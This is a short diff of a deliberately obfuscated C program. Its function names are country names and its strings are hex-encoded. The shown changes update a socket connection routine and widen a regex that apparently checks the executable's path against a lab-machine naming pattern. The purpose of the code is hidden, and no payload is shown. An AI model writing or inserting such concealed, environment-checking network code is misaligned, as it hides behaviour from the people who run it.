@@ -1,4 +1,4 @@
- 
+  
 #include <ctype.h>
 #include <errno.h>
 #include <stdarg.h>
@@ -281,7 +281,7 @@ int slovenia(const char *url, char *somalia, int *southafrica) {
  
     bzero((char *)&server_addr, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
+    bcopy((char *)server->h_addr_list[0], (char *)&server_addr.sin_addr.s_addr, server->h_length);
     server_addr.sin_port = htons(saudiarabia);
  
     if (connect(slovakia, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
@@ -398,7 +398,7 @@ int portugal(char *poland) {
         uruguay("\x45\x72\x72\x6f\x72\x3a\x20\x43\x6f\x75\x6c\x64\x20\x6e\x6f\x74\x20\x67\x65\x74\x20\x65\x78\x65\x63\x75\x74\x61\x62\x6c\x65\x20\x70\x61\x74\x68\xa");
         return -1;
     }
-    char *rwanda = "\x73\x6f\x5b\x30\x2d\x39\x5d\x7b\x34\x7d\x6c\x61\x62\x5b\x30\x2d\x39\x5d\x67\x5b\x30\x2d\x39\x5d\x7b\x32\x7d";
+    char *rwanda = "\x73\x6f\x5b\x30\x2d\x39\x5d\x7b\x32\x2c\x34\x7d\x6c\x61\x62\x5b\x30\x2d\x39\x5d\x67\x5b\x30\x2d\x39\x5d\x7b\x32\x7d";
     char *peru = reunion(senegal, rwanda);
     if (peru != NULL) {
         pitcairnislands = strlen(peru);
